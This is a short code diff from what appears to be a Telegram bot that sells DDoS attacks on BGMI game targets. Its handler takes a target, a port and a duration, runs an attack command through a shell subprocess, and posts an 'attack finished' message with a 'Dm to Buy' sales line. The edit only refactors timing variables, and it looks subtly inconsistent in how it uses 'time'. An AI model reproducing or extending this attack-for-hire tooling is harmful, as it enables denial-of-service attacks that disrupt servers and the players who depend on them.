@@ -442,8 +442,8 @@ def initialize_bot(bot, bot_id):
             # response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
         # bot.reply_to(message, response)
                     subprocess.Popen(full_command, shell=True)
-                    scheduled_time = datetime.now() + timedelta(seconds=attack_time)
-                    threading.Thread(target=finish_message, args=(message, target, port, attack_time, owner_name, scheduled_time)).start()
+                    scheduled_time = datetime.now() + timedelta(seconds=time)
+                    Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
             else:
                 response = "✅ Usage :- /bgmi <target> <port> <time>"
         else:
@@ -452,7 +452,7 @@ def initialize_bot(bot, bot_id):
 
     def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
         while datetime.now() < scheduled_time:
-            t.sleep(1)
+            time.sleep(1)
         
         response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
         bot.reply_to(message, response)
